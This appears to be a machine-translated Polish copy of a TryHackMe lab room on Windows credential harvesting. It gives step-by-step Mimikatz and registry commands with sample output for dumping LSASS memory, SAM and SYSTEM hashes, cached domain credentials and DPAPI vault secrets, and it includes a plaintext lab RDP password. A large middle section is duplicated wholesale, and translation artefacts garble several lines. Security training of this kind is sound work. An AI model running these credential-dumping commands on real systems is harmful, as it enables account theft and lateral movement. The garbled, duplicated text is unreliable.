---

Zbieranie danych uwierzytelniających (credential harvesting) to jedna z najskuteczniejszych i najczęściej stosowanych taktyk w ofensywnych ocenach bezpieczeństwa. Zamiast polegać na exploitach lub lukach w zabezpieczeniach powodujących eskalację uprawnień, atakujący często osiągają sukces, po prostu pozyskując dane uwierzytelniające z miejsca, w którym system operacyjny je przechowuje. Po przejęciu kontroli nad komputerem z systemem Windows, zwłaszcza z uprawnieniami administratora lokalnego, okaże się, że system ten przechowuje zaskakująco dużą liczbę sekretów. W tym artykule skupimy się na tym, gdzie przechowywane są te dane uwierzytelniające i jak je wyodrębnić.

**Cele edukacyjne**

- Zidentyfikuj centralne mechanizmy przechowywania danych uwierzytelniających w systemie Windows i usłudze Active Directory
- Wyodrębnij dane uwierzytelniające za pomocą Mimikatz i Impacket
- Zrozum różnice w wynikach w zależności od uprawnień użytkownika
- Łamanie haszy za pomocą Hashcata lub John the  Ripper

**Wymagania wstępne**

Aby w pełni wykorzystać potencjał tego pomieszczenia, zalecamy:

- Ukończenie [sali Podstawy usługi Active Directory](https://tryhackme.com/room/winadbasics)
- Ukończenie "OGŁOSZENIEPokoje „wyliczeniowe”
- Uzupełnianie [pokoju Podstawy haszowania](https://tryhackme.com/room/hashingbasics)
- Uzupełnianie [pokoju Johna Rozpruwacza](https://tryhackme.com/room/johntheripperbasics)
- Czuj się komfortowoPowerShelli CMD w systemie Windows

## Uruchamianie sieci

Zanim przejdziesz do następnego zadania, kliknij zielony przycisk **Start** pod schematem sieci. Daj sieci wystarczająco dużo czasu na uruchomienie. Możesz połączyć się z siecią na dwa sposoby:

### Opcja 1: Użycie AttackBox

Kliknij przycisk **„Uruchom AttackBox”** u góry tego pokoju. Gdy AttackBox będzie gotowy, będzie dostępny na podzielonym ekranie.

### Opcja 2: PonadVPNPołączenie

Alternatywnie, możesz połączyć się z siecią przez VPN. Aby nawiązać połączenie VPN z tą siecią, przejdź na [stronę dostępu](https://tryhackme.com/manage-account/access-open-vpn) , kliknij kartę **Sieci** , wybierz **Jr-Pentester-Intro-AD-Creds** i kliknij przycisk **Pobierz plik konfiguracyjny** . Jeśli nie widzisz tego pliku dostępnego do pobrania, upewnij się, że sieć w pokoju została uruchomiona i odczekaj kilka minut.

![](https://cdn-images.tryhackme.com/user-uploads/62ff64c3c859dc0042b2b9f6/room-content/62ff64c3c859dc0042b2b9f6-1751987902745.png)

Następnie uruchom poniższe polecenie w tym samym katalogu, w którym znajduje się plik konfiguracyjny sieci VPN:

`sudo openvpn [your_configuration_file_name.ovpn]`

### Sprawdzanie łączności z siecią

Możesz uruchomić `route`polecenie, aby sprawdzić, czy komputer atakującego może komunikować się z siecią docelową. Poniższy terminal pokazuje przykładowe dane wyjściowe.

Terminal

```shell-session
root@tryhackme:~# route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.10.0.1       0.0.0.0         UG    100    0        0 ens5
10.10.0.0       0.0.0.0         255.255.0.0     U     100    0        0 ens5
10.10.0.1       0.0.0.0         255.255.255.255 UH    100    0        0 ens5
[...]
10.220.10.0     10.250.11.1     255.255.255.0   UG    1000   0        0 tun0
10.250.10.0     0.0.0.0         255.255.255.0   U     0      0        0 tun0
[...]
```

Alternatywnie możesz użyć `ip route`polecenia.

Terminal

```shell-session
root@tryhackme:~# ip route
default via 10.10.0.1 dev ens5 proto dhcp src 10.10.130.73 metric 100 
10.10.0.0/16 dev ens5 proto kernel scope link src 10.10.130.73 metric 100 
10.10.0.1 dev ens5 proto dhcp scope link src 10.10.130.73 metric 100 
[...]
10.220.10.0/24 via 10.250.11.1 dev tun0 metric 1000 
10.250.10.0/24 dev tun0 proto kernel scope link src 10.250.11.2 
[...]
```

Sprawdź, czy podsieć jest widoczna `10.220.10.0`w wynikach polecenia. Jeśli tak, Twój komputer powinien móc komunikować się z siecią docelową. Możesz również użyć polecenia `ping`na komputerach laboratoryjnych.

## Problemy z łącznością

Jeśli nie możesz nawiązać połączenia z siecią, kliknij strzałkę rozwijaną poniżej.

System Windows i usługa Active Directory przechowują dane uwierzytelniające w różnych formatach i lokalizacjach, w zależności od tego, czy system jest samodzielny czy przyłączony do domeny, a także od tego, czy użytkownicy potrzebują ich do logowania, ponownego uwierzytelniania, dostępu offline lub integracji aplikacji.

Dla pentesterów te mechanizmy przechowywania danych reprezentują szereg możliwości gromadzenia danych, z których każda wiąże się z innymi wymaganiami, wynikami i wymaganymi poziomami uprawnień. W tym zadaniu wyjaśnimy każdy magazyn danych uwierzytelniających, jego cel istnienia i sposób interakcji z nim w kolejnych zadaniach.

**Pamięć LSASS**

Usługa podsystemu lokalnego **urzędu bezpieczeństwa (LSASS)** egzekwuje zasady bezpieczeństwa systemu Windows i zarządza uwierzytelnianiem. Aktywnie przechowuje w pamięci poufne dane uwierzytelniające: **NTLM**i **skróty haseł LM** ,**Kerberostickets (w tym bilety TGT i bilety serwisowe), a czasami także dane uwierzytelniające w postaci zwykłego tekstu. Ta pamięć masowa obsługuje funkcje takie jak logowanie jednokrotne (SSO), umożliwiając transparentne ponowne wykorzystywanie danych uwierzytelniających między usługami. Atakujący, którzy uzyskają dostęp **na poziomie SYSTEMU,** mogą zrzucić pamięć procesu LSASS, aby wyodrębnić te dane uwierzytelniające w celu ich późniejszego wykorzystania lub eskalacji uprawnień. Ponieważ dane są dynamiczne i dostępne na żywo, **pamięć LSASS** jest głównym celem kradzieży danych uwierzytelniających w zainfekowanych systemach.

**SAM + SYSTEM Hives**

Gałąź Security **Accounts Manager (SAM)** to kluczowa baza danych rejestru systemu Windows przechowująca skróty haseł dla lokalnych kont użytkowników (w tym administratorów). Skróty są szyfrowane. Odszyfrowanie wymaga klucza pomocniczego, BootKey **,** pochodzącego z **gałęzi SYSTEM** . Atakujący wyodrębniają obie gałęzie i używają specjalistycznych narzędzi do odzyskania wszystkich skrótów kont lokalnych. Pozwala im to na próbę złamania hasła offline lub podszywania się pod użytkowników lokalnych. Gałąź **SAM** fizycznie znajduje się w [ brakuje nazwy użytkownika `%SystemRoot%\system32\config\SAM`], a gałąź **SYSTEM**`%SystemRoot%\system32\config\SYSTEM` w [brakuje nazwy użytkownika ]. Wydobycie zazwyczaj wymaga uprawnień **SYSTEM** , takich jak eksport rejestru, kopiowanie woluminów w tle lub bezpośredni dostęp do plików, gdy system operacyjny jest offline.

**Tajemnice LSA**

System Windows przechowuje **sekrety LSA** w kluczu rejestru `HKLM\SECURITY\Policy\Secrets`, który zawiera poufne informacje, takie jak **buforowane dane uwierzytelniające domeny** do logowania offline, **hasła w postaci zwykłego tekstu** (używane przez zaplanowane zadania lub usługi), a czasami **hasła sesji RDP** . Ponieważ te sekrety są często w postaci zwykłego tekstu lub łatwe do odszyfrowania, są cenne dla atakujących, którzy chcą ponownie wykorzystać dane uwierzytelniające. Tylko użytkownicy **SYSTEM** lub **administratorzy** mogą pobrać te sekrety za pośrednictwem interfejsu **protokołu LSARPC (Local Security Authority Remote Protocol)** lub specjalistycznych narzędzi.

**Skarbiec DPAPI**

Interfejs **API Ochrony Danych (DPAPI)** to wbudowana usługa kryptograficzna systemu Windows, która chroni poufne dane aplikacji dla każdego użytkownika. DPAPI Vault definiuje klucz główny dla każdego użytkownika, używany do szyfrowania danych uwierzytelniających (takich jak zapisane hasła Wi-Fi i loginy do przeglądarek). Klucz główny jest szyfrowany kluczem utworzonym na podstawie hasła użytkownika do systemu Windows i przechowywany w `%APPDATA%\Microsoft\Protect`. Atakujący z dostępem do klucza głównego i hasła logowania użytkownika mogą odszyfrować wszystkie poufne dane chronione przez DPAPI dla danego konta użytkownika, ujawniając szeroki zakres przechowywanych danych uwierzytelniających.

**NTDS.dit**

**NTDS.dit** to podstawowa baza danych Active Directory, obecna tylko na kontrolerach domeny. Przechowuje wszystkie konta użytkowników domeny, obiekty komputerów, nazwy usług, **skróty haseł NTLM** oraz klucze **Kerberos** . Ponieważ reprezentuje on autoryzację uwierzytelniającą dla całej domeny, uzyskanie dostępu do NTDS.dit daje atakującemu wszystkie dane uwierzytelniające niezbędne do podszywania się pod dowolnego użytkownika domeny lub usługę, co czyni go najcenniejszym magazynem danych uwierzytelniających w środowiskach domenowych.

W tej tabeli podsumowano sklepy, które będziemy realizować w kolejnych zadaniach:

|**Sklep**|**Co zawiera**|**Dlaczego istnieje**|**Metoda dostępu**|**Narzędzia i polecenia**|
|---|---|---|---|---|
|**Pamięć LSASS**|Skróty NTLM, bilety Kerberos, tekst jawny (czasami)|Umożliwia bezproblemowe logowanie do różnych usług|Zrzuć pamięć operacyjną **lsass.exe**|**mimikatz**<br><br>`sekurlsa::logonpasswords`<br><br>`sekurlsa::minidump`|
|**SAM + SYSTEM Hives**|Lokalne skróty kont|Uwierzytelnianie dla logowań lokalnych (np. administrator lokalny)|Eksportuj gałęzie rejestru, wyodrębnij za pomocą klucza rozruchowego|**mimikatz**<br><br>`lsadump::sam`<br><br>`vssadmin`wyodrębnić|
|**Tajemnice LSA**|Dane uwierzytelniające domeny w pamięci podręcznej, dane uwierzytelniające usługi w postaci zwykłego tekstu|Umożliwia logowanie offline, przechowuje hasła zaplanowanych zadań i sekrety RDP|RPC przez nazwany potok LSARPC|**secretsdump.py** z lokalnymi uprawnieniami administratora|
|**Skarbiec DPAPI**|Zapisane hasła z aplikacji (RDP, przeglądarki, WiFi)|Bezpieczne przechowywanie danych kredytowych na poziomie użytkownika|Dostęp za pomocą tokena użytkownika lub odszyfrowanego klucza głównego|**mimikatz**<br><br>`vault::list`<br><br>`vault::cred /export`wyodrębnić|
|**NTDS.dit** _(tylko DC)_|Pełna baza danych domeny: nazwy użytkowników, klucze NTLM i Kerberos|Uwierzytelnianie i replikacja domeny|Replikuj przez MS-DRSR lub analizuj plik offline|`secretsdump.py -just-dc`<br><br>`lsadump::dcsync`|

Mamy teraz solidny przegląd tego, gdzie system Windows i Active Directory przechowują dane uwierzytelniające i dlaczego. Od pamięci operacyjnej, przez **gałęzie rejestru** , po **sekrety DPAPI** , każda metoda przechowywania danych oferuje różne punkty dostępu zarówno atakującym, jak i obrońcom. W poniższych zadaniach poznamy praktyczne narzędzia i techniki wyodrębniania tych danych uwierzytelniających.

_vault::cred /export_

Mimikatz to jedno z najpotężniejszych narzędzi do obsługi systemów Windows po ich eksploatacji. Umożliwia wyodrębnianie danych uwierzytelniających z pamięci operacyjnej, gałęzi rejestru i zaszyfrowanych magazynów danych uwierzytelniających. Mimikatz współpracuje z interfejsami API systemu Windows, odczytując pamięć LSASS , analizując gałęzie rejestru, takie jak SAM i SYSTEM , oraz dekodując bloby DPAPI z repozytorium użytkownika.

W tym zadaniu wykorzystamy narzędzie mimikatz do zebrania danych uwierzytelniających z różnych sklepów:

Pamięć LSASS (dla bieżących danych uwierzytelniających sesji)
Ule SAM i SYSTEM (dla skrótów kont lokalnych)
Tajemnice LSA (dla buforowanych danych uwierzytelniających domeny i kont usług)
Tajemnice DPAPI (dlaRDPi danych uwierzytelniających witrynę)
Naszym celem jest przejście z dostępu administratora lokalnego na stacji roboczej przyłączonej do domeny ( WRK ) do uzyskania zdalnego dostępu do powłoki jako administrator domeny naDC, z różnymi technikami pozyskiwania danych uwierzytelniających. Chcemy ukraść sekret (flagę) z folderu pulpitu administratora domeny.

Uruchom Mimikatz jako administrator z sesji RDP (plik binarny znajduje się w folderze Pulpit). Ponieważ mamy dostęp do lokalnego administratora, wyłączyliśmy program Windows Defender , ponieważ blokuje on Mimikatz.

Bezpieczny dla DPAPI
Ochrona danychAPI(DPAPI) jest używany przez system Windows do bezpiecznego przechowywania zarejestrowanych identyfikatorów, takich jak połączenia RDP, hasła internetowe czy klucze Wi-Fi. Te sekrety są przechowywane w sejfie użytkownika i szyfrowane kluczami powiązanymi z jego kontem Windows. Mimikatz potrafi wyodrębnić i odszyfrować te dane w kontekście użytkownika docelowego, co czyni go skutecznym narzędziem do odzyskiwania zapisanych danych uwierzytelniających bez konieczności używania skrótów i aktywnej sesji. Aby wyświetlić listę dostępnych sejfów, możemy uruchomić następujące polecenie:

Terminal
mimikatz # vault::list

Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
        Name       : Web Credentials
        Path       : C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Items (0)

Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
        Name       : Windows Credentials
        Path       : C:\Users\Administrator\AppData\Local\Microsoft\Vault
        Items (1)
          0.    (null)
                Type            : {3e0e35be-1b77-43e7-b873-aed901b6275b}
                LastWritten     : 01/07/2025 13:56:42
                Flags           : 00000000
                Ressource       : [STRING] Domain:target=WRK
                Identity        : [STRING] TRYHACKME\svc-app
                Authenticator   :
                PackageSid      :
                *Authenticator* : [BYTE*]
Zauważamy, że dostępne są dwa sejfy: Poświadczenia systemu Windows i Poświadczenia sieciowe . W niektórych nowszych wersjach systemu Windows lub w zależności od aplikacji, niektóre poświadczenia sieciowe (np. zapisane hasła do Gmaila) mogą być przechowywane lub dostępne w sejfie Poświadczenia systemu Windows. W związku z tym widzimy jeden element obecny w tym sejfie.

Możemy wyodrębnić dane uwierzytelniające:

Terminal
mimikatz # vault::cred /export
TargetName : WRK / &lt;NULL&gt;
UserName   : TRYHACKME\svc-app
Comment    : &lt;NULL&gt;
Type       : 2 - domain_password
Persist    : 3 - enterprise
Flags      : 00000000
Credential :
Attributes : 0

TargetName : gmail.com / &lt;NULL&gt;
UserName   : ElonTusk
Comment    : &lt;NULL&gt;
Type       : 1 - generic
Persist    : 3 - enterprise
Flags      : 00000000
Credential : *******
Jako administrator lokalny mamy dostęp do plików profili użytkowników, w tym do kluczy głównych DPAPI i danych w skarbcu, w których przechowywane są dane uwierzytelniające. Ten dostęp na poziomie plików często pozwala narzędziom takim jak Mimikatz na odszyfrowanie i wyświetlenie tych haseł nawet bez dodatkowych uprawnień, takich jak privilege::debug. Jednak dane uwierzytelniające konta usługi, takie jak te dla aplikacji SVC, są chronione kluczami DPAPI wyraźnie powiązanymi z kontekstem użytkownika tego konta usługi. Bez uruchomienia jako użytkownik aplikacji SVC lub podszywania się pod niego , ani bez znajomości jego hasła lub tokena, Mimikatz nie może odszyfrować sekretów w skarbcu, więc hasła te pozostają ukryte.

Hives SAM + SYSTEM
Baza danych Security Account Manager (SAM) zawiera zaszyfrowane hasła lokalnych kont użytkowników. Hasze te są szyfrowane za pomocą klucza przechowywanego w rejestrze SYSTEM . Poprzez wyodrębnienie i połączenie tych dwóch gałęzi, narzędzia takie jak Mimikatz mogą odszyfrować ich zawartość i wyodrębnić hasze NTLM lokalnych użytkowników, nawet jeśli ostatnio się nie logowali. Możemy następnie złamać te hasze offline lub ponownie je wykorzystać za pomocą ataków typu pass-the-hash.

Najpierw musimy utworzyć kopię gałęzi rejestru SAM i SYSTEM . Otwórz program PowerShell jako administrator i uruchom:

Terminal
reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM
The operation completed successfully.
reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SYSTEM
The operation completed successfully.
Następnie, w mimikatz, uruchom:

Terminal
mimikatz # lsadump::sam /sam:"C:\Users\Administrator\Desktop\SAM" /system:"C:\Users\Administrator\Desktop\SYSTEM"  

Domain : WRK
SysKey : fa0661c3eee8696eeb436f2bafa060e7
Local SID : S-1-5-21-1299963100-3047866590-1771456640

SAMKey : f010e877149271eb7483d770b792b556

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 568a741b56c79622cc3f4c83720bf45e
...
lsadump::sam:Zrzucamy rejestr SAM , który zawiera lokalne skróty użytkowników. Aby to zrobić, musimy określić, gdzie zapisaliśmy nasze kopie SAM i SYSTEM , aby mimkatz wiedział, gdzie szukać.
Wyodrębnianie danych uwierzytelniających z pamięci podręcznej
Lokalny Urząd Bezpieczeństwa (LSA) zarządza logowaniem użytkowników i zabezpieczeniami systemu Windows. Jego główny proces, LSASS (lsass.exe) , przechowuje dane uwierzytelniające (takie jak skróty haseł i tokeny) i chroni je przed nieautoryzowanym dostępem. Dostęp do pamięci LSASS wymaga uprawnień administratora i umożliwia wyodrębnienie aktualnie używanych danych uwierzytelniających. Dostęp do sekretów LSA zazwyczaj wiąże się z odczytem zaszyfrowanych danych z rejestru systemu Windows, często wymagającym dostępu na poziomie SYSTEMU i specjalnych narzędzi do ich odszyfrowania.

Pamięć LSASS

Z poziomu sesji RDP lokalnego administratora uruchom program mimikatz (znajdujący się na lokalnym pulpicie administratora) jako administrator i wprowadź następujące polecenia:

Terminal
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1680928 (00000000:0019a620)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : WRK
Logon Server      : WRK
Logon Time        : 09/07/2025 16:19:53
SID               : S-1-5-21-1299963100-3047866590-1771456640-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : WRK
         * NTLM     : *****************************
         * SHA1     : 72bac754745048a56578a70c478053f7b9629501
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : WRK
         * Password : *************
        kerberos :
         * Username : Administrator
         * Domain   : WRK
         * Password : (null)
        ssp :
        credman :
         [00000000]
         * Username : TRYHACKME\svc-app
         * Domain   : WRK
         * Password : *************
         [00000001]
         * Username : ElonTusk
         * Domain   : gmail.com
         * Password : *************
         ...
privilege::debug:Włącza SeDebugPrivilege, aby program Mimikatz mógł odczytywać i manipulować pamięcią procesów (wymagane w przypadku zrzutów LSASS).
sekurlsa::logonpasswords: Odczytuje struktury poświadczeń z pamięci LSASS. Oczekiwany wynik : Zrzut wszystkich bieżących sesji użytkowników, w tym nazw użytkowników, domen, skrótów NTLM/SHA1 i haseł w postaci zwykłego tekstu znalezionych w pamięci.
Nie otrzymujemy żadnych danych uwierzytelniających użytkowników domeny, ponieważ obecnie nie mają oni żadnych aktywnych sesji na WRK ; w związku z tym pamięć LSASS nie przechowuje ich już, nawet jeśli zalogowali się wcześniej.

Tajemnice LSA

Jeśli jednak podniesiemy nasz token do poziomu System , możemy użyć go lsadump::cachedo wyodrębnienia danych uwierzytelniających domeny z pamięci podręcznej w WRK . W następnym zadaniu użyjemy pliku secretsdump.py , aby to osiągnąć; możesz jednak również poeksperymentować z Mimikatz, uruchamiając następujące polecenia:

Terminal
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

mimikatz # lsadump::cache
Domain : WRK
RID       : 000001f4 (500)
User      : TRYHACKME\Administrator
MsCacheV2 : ******************

[NL$2 - 17/07/2025 12:36:02]
RID       : 00000649 (1609)
User      : TRYHACKME\raoulduke
MsCacheV2 : *******************
...

token::elevate:Kradniemy token SYSTEM, aby działać jako najwyższe konto lokalne systemu Windows.
lsadump::cache:Odczytuje pamięć podręczną LSA na dysku ( MSCacheV2 ). W ten sposób otrzymujemy zaszyfrowane klucze logowania użytkownika domeny zapisane do uwierzytelniania offline.
W tym zadaniu wykorzystaliśmy program Mimikatz i nasz lokalny dostęp administratora do zrzutu danych uwierzytelniających z wielu lokalizacji. Zrzuciliśmy dane uwierzytelniające w postaci zwykłego tekstu dla użytkownika domeny, svc-app , oraz dane uwierzytelniające w postaci sieci dla użytkownika lokalnego, ElonTusk . W kontekście testu penetracyjnego mogliśmy spróbować ponownie wykorzystać te dane uwierzytelniające na innych komputerach lub dodać te znane hasła do naszej listy ataków polegających na rozpylaniu haseł.

Jak uruchomić sesję RDP:

1. **Otwórz Terminal**: Kliknij dwukrotnie ikonę **Terminal** na pulpicie swojego AttackBoxa.
2. **Wpisz komendę połączenia**: Użyj programu `xfreerdp` (lub `remmina`), wpisując w terminalu:
    
    bash
    
    ```
    xfreerdp /v:10.129.113.160 /u:Administrator /p:N3w34829DJdd?1 /dynamic-resolution +clipboard
    ```

xfreerdp /v:10.129.113.160 /u:Administrator /p:'N3w34829DJdd?1' /dynamic-resolution +clipboard

Mimikatz to jedno z najpotężniejszych narzędzi do obsługi systemów Windows po ich eksploatacji. Umożliwia wyodrębnianie danych uwierzytelniających z pamięci operacyjnej, gałęzi rejestru i zaszyfrowanych magazynów danych uwierzytelniających. Mimikatz współpracuje z interfejsami API systemu Windows, odczytując pamięć LSASS , analizując gałęzie rejestru, takie jak SAM i SYSTEM , oraz dekodując bloby DPAPI z repozytorium użytkownika.

W tym zadaniu wykorzystamy narzędzie mimikatz do zebrania danych uwierzytelniających z różnych sklepów:

Pamięć LSASS (dla bieżących danych uwierzytelniających sesji)
Ule SAM i SYSTEM (dla skrótów kont lokalnych)
Tajemnice LSA (dla buforowanych danych uwierzytelniających domeny i kont usług)
Tajemnice DPAPI (dlaRDPi danych uwierzytelniających witrynę)
Naszym celem jest przejście z dostępu administratora lokalnego na stacji roboczej przyłączonej do domeny ( WRK ) do uzyskania zdalnego dostępu do powłoki jako administrator domeny naDC, z różnymi technikami pozyskiwania danych uwierzytelniających. Chcemy ukraść sekret (flagę) z folderu pulpitu administratora domeny.

Uruchom Mimikatz jako administrator z sesji RDP (plik binarny znajduje się w folderze Pulpit). Ponieważ mamy dostęp do lokalnego administratora, wyłączyliśmy program Windows Defender , ponieważ blokuje on Mimikatz.

Bezpieczny dla DPAPI
Ochrona danychAPI(DPAPI) jest używany przez system Windows do bezpiecznego przechowywania zarejestrowanych identyfikatorów, takich jak połączenia RDP, hasła internetowe czy klucze Wi-Fi. Te sekrety są przechowywane w sejfie użytkownika i szyfrowane kluczami powiązanymi z jego kontem Windows. Mimikatz potrafi wyodrębnić i odszyfrować te dane w kontekście użytkownika docelowego, co czyni go skutecznym narzędziem do odzyskiwania zapisanych danych uwierzytelniających bez konieczności używania skrótów i aktywnej sesji. Aby wyświetlić listę dostępnych sejfów, możemy uruchomić następujące polecenie:

Terminal
mimikatz # vault::list

Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
        Name       : Web Credentials
        Path       : C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Items (0)

Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
        Name       : Windows Credentials
        Path       : C:\Users\Administrator\AppData\Local\Microsoft\Vault
        Items (1)
          0.    (null)
                Type            : {3e0e35be-1b77-43e7-b873-aed901b6275b}
                LastWritten     : 01/07/2025 13:56:42
                Flags           : 00000000
                Ressource       : [STRING] Domain:target=WRK
                Identity        : [STRING] TRYHACKME\svc-app
                Authenticator   :
                PackageSid      :
                *Authenticator* : [BYTE*]
Zauważamy, że dostępne są dwa sejfy: Poświadczenia systemu Windows i Poświadczenia sieciowe . W niektórych nowszych wersjach systemu Windows lub w zależności od aplikacji, niektóre poświadczenia sieciowe (np. zapisane hasła do Gmaila) mogą być przechowywane lub dostępne w sejfie Poświadczenia systemu Windows. W związku z tym widzimy jeden element obecny w tym sejfie.

Możemy wyodrębnić dane uwierzytelniające:

Terminal
mimikatz # vault::cred /export
TargetName : WRK / &lt;NULL&gt;
UserName   : TRYHACKME\svc-app
Comment    : &lt;NULL&gt;
Type       : 2 - domain_password
Persist    : 3 - enterprise
Flags      : 00000000
Credential :
Attributes : 0

TargetName : gmail.com / &lt;NULL&gt;
UserName   : ElonTusk
Comment    : &lt;NULL&gt;
Type       : 1 - generic
Persist    : 3 - enterprise
Flags      : 00000000
Credential : *******
Jako administrator lokalny mamy dostęp do plików profili użytkowników, w tym do kluczy głównych DPAPI i danych w skarbcu, w których przechowywane są dane uwierzytelniające. Ten dostęp na poziomie plików często pozwala narzędziom takim jak Mimikatz na odszyfrowanie i wyświetlenie tych haseł nawet bez dodatkowych uprawnień, takich jak privilege::debug. Jednak dane uwierzytelniające konta usługi, takie jak te dla aplikacji SVC, są chronione kluczami DPAPI wyraźnie powiązanymi z kontekstem użytkownika tego konta usługi. Bez uruchomienia jako użytkownik aplikacji SVC lub podszywania się pod niego , ani bez znajomości jego hasła lub tokena, Mimikatz nie może odszyfrować sekretów w skarbcu, więc hasła te pozostają ukryte.

Hives SAM + SYSTEM
Baza danych Security Account Manager (SAM) zawiera zaszyfrowane hasła lokalnych kont użytkowników. Hasze te są szyfrowane za pomocą klucza przechowywanego w rejestrze SYSTEM . Poprzez wyodrębnienie i połączenie tych dwóch gałęzi, narzędzia takie jak Mimikatz mogą odszyfrować ich zawartość i wyodrębnić hasze NTLM lokalnych użytkowników, nawet jeśli ostatnio się nie logowali. Możemy następnie złamać te hasze offline lub ponownie je wykorzystać za pomocą ataków typu pass-the-hash.

Najpierw musimy utworzyć kopię gałęzi rejestru SAM i SYSTEM . Otwórz program PowerShell jako administrator i uruchom:

Terminal
reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM
The operation completed successfully.
reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SYSTEM
The operation completed successfully.
Następnie, w mimikatz, uruchom:

Terminal
mimikatz # lsadump::sam /sam:"C:\Users\Administrator\Desktop\SAM" /system:"C:\Users\Administrator\Desktop\SYSTEM"  

Domain : WRK
SysKey : fa0661c3eee8696eeb436f2bafa060e7
Local SID : S-1-5-21-1299963100-3047866590-1771456640

SAMKey : f010e877149271eb7483d770b792b556

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 568a741b56c79622cc3f4c83720bf45e
...
lsadump::sam:Zrzucamy rejestr SAM , który zawiera lokalne skróty użytkowników. Aby to zrobić, musimy określić, gdzie zapisaliśmy nasze kopie SAM i SYSTEM , aby mimkatz wiedział, gdzie szukać.
Wyodrębnianie danych uwierzytelniających z pamięci podręcznej
Lokalny Urząd Bezpieczeństwa (LSA) zarządza logowaniem użytkowników i zabezpieczeniami systemu Windows. Jego główny proces, LSASS (lsass.exe) , przechowuje dane uwierzytelniające (takie jak skróty haseł i tokeny) i chroni je przed nieautoryzowanym dostępem. Dostęp do pamięci LSASS wymaga uprawnień administratora i umożliwia wyodrębnienie aktualnie używanych danych uwierzytelniających. Dostęp do sekretów LSA zazwyczaj wiąże się z odczytem zaszyfrowanych danych z rejestru systemu Windows, często wymagającym dostępu na poziomie SYSTEMU i specjalnych narzędzi do ich odszyfrowania.

Pamięć LSASS

Z poziomu sesji RDP lokalnego administratora uruchom program mimikatz (znajdujący się na lokalnym pulpicie administratora) jako administrator i wprowadź następujące polecenia:

Terminal
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1680928 (00000000:0019a620)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : WRK
Logon Server      : WRK
Logon Time        : 09/07/2025 16:19:53
SID               : S-1-5-21-1299963100-3047866590-1771456640-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : WRK
         * NTLM     : *****************************
         * SHA1     : 72bac754745048a56578a70c478053f7b9629501
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : WRK
         * Password : *************
        kerberos :
         * Username : Administrator
         * Domain   : WRK
         * Password : (null)
        ssp :
        credman :
         [00000000]
         * Username : TRYHACKME\svc-app
         * Domain   : WRK
         * Password : *************
         [00000001]
         * Username : ElonTusk
         * Domain   : gmail.com
         * Password : *************
         ...
privilege::debug:Włącza SeDebugPrivilege, aby program Mimikatz mógł odczytywać i manipulować pamięcią procesów (wymagane w przypadku zrzutów LSASS).
sekurlsa::logonpasswords: Odczytuje struktury poświadczeń z pamięci LSASS. Oczekiwany wynik : Zrzut wszystkich bieżących sesji użytkowników, w tym nazw użytkowników, domen, skrótów NTLM/SHA1 i haseł w postaci zwykłego tekstu znalezionych w pamięci.
Nie otrzymujemy żadnych danych uwierzytelniających użytkowników domeny, ponieważ obecnie nie mają oni żadnych aktywnych sesji na WRK ; w związku z tym pamięć LSASS nie przechowuje ich już, nawet jeśli zalogowali się wcześniej.

Tajemnice LSA

Jeśli jednak podniesiemy nasz token do poziomu System , możemy użyć go lsadump::cachedo wyodrębnienia danych uwierzytelniających domeny z pamięci podręcznej w WRK . W następnym zadaniu użyjemy pliku secretsdump.py , aby to osiągnąć; możesz jednak również poeksperymentować z Mimikatz, uruchamiając następujące polecenia:

Terminal
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

mimikatz # lsadump::cache
Domain : WRK
RID       : 000001f4 (500)
User      : TRYHACKME\Administrator
MsCacheV2 : ******************

[NL$2 - 17/07/2025 12:36:02]
RID       : 00000649 (1609)
User      : TRYHACKME\raoulduke
MsCacheV2 : *******************
...

token::elevate:Kradniemy token SYSTEM, aby działać jako najwyższe konto lokalne systemu Windows.
lsadump::cache:Odczytuje pamięć podręczną LSA na dysku ( MSCacheV2 ). W ten sposób otrzymujemy zaszyfrowane klucze logowania użytkownika domeny zapisane do uwierzytelniania offline.
W tym zadaniu wykorzystaliśmy program Mimikatz i nasz lokalny dostęp administratora do zrzutu danych uwierzytelniających z wielu lokalizacji. Zrzuciliśmy dane uwierzytelniające w postaci zwykłego tekstu dla użytkownika domeny, svc-app , oraz dane uwierzytelniające w postaci sieci dla użytkownika lokalnego, ElonTusk . W kontekście testu penetracyjnego mogliśmy spróbować ponownie wykorzystać te dane uwierzytelniające na innych komputerach lub dodać te znane hasła do naszej listy ataków polegających na rozpylaniu haseł.

W środowiskach Active Directory dostęp do sekretów jest często zdalny za pośrednictwem natywnych usług systemu Windows. Plik Secretsdump.py z pakietu Impacket pozwala nam wyodrębnić te sekrety.MŚPKorzystając z DCE/RPC . To narzędzie umożliwia pobieranie lokalnych haszy, sekretów LSA, a nawet pełnych danych uwierzytelniających domeny, w zależności od uprawnień używanego konta.

